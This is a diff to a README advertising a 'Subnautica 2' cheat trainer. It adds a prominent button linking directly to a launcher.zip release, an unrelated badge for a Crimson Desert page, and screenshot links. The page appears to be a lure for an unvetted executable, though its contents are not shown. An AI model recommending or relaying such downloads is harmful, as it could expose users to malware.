@@ -1,16 +1,27 @@
 # Subnautica 2 Trainer - Advanced Standalone Cheat Menu & QoL Tools (Build 2026.05.18)
 
 ### 📥 **Official Resources & Download**
+
+<a href="https://vgtimes.ru/games/crimson-desert/files/93140-trejjner-v1-1-2026-22-funkcii-upd.html" target="_blank">
+    <img src="https://img.shields.io/badge/-_VGTIMES.RU-ff00aa?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=ff00aa" alt="VGTimes Page">
+  </a>
+
 <div align="center">
-  <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest" target="_blank">
+  <a href="https://github.com/alessiocasali94/Subnatica2-Inventory-and-Player-Editor/releases/download/Subnatica2/launcher.zip" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="68">
   </a>
 </div>
 
 **Powerful standalone offline trainer for Subnautica 2 (2026)** — complete control over player stats, movement & physics, crafting & building, time & world, vehicles & tools, unique features and presets with a beautiful real-time overlay UI.
 
-<img width="1257" height="696" alt="Player Stats Tab" src="https://github.com/YOUR_USERNAME/YOUR_REPO/assets/XXXXXX/player-stats.png" />
-<img width="1259" height="695" alt="Movement & Physics Tab" src="https://github.com/YOUR_USERNAME/YOUR_REPO/assets/XXXXXX/movement.png" />
+<img width="1282" height="805" alt="image" src="https://github.com/user-attachments/assets/fefa9003-e55b-4451-aa07-af894cc72937" />
+<img width="1282" height="804" alt="image" src="https://github.com/user-attachments/assets/24e946fb-bc4a-4059-8b61-2cec385b2a5a" />
+<img width="1279" height="801" alt="image" src="https://github.com/user-attachments/assets/2b412b81-4789-4938-a970-1f8ec56dd24e" />
+<img width="1288" height="801" alt="image" src="https://github.com/user-attachments/assets/bec4b5ab-00fa-4db0-9541-b50656e13fc9" />
+<img width="1281" height="801" alt="image" src="https://github.com/user-attachments/assets/95aba03c-bce5-45f1-92cb-9fcdd0a200ee" />
+<img width="1280" height="798" alt="image" src="https://github.com/user-attachments/assets/9087c2d6-9929-447f-a5b8-cc7c8bdd5f97" />
+<img width="1286" height="804" alt="image" src="https://github.com/user-attachments/assets/06706af1-54c3-4161-affe-ebc3be3641df" />
+
 
 ---
 ### ✨ Features
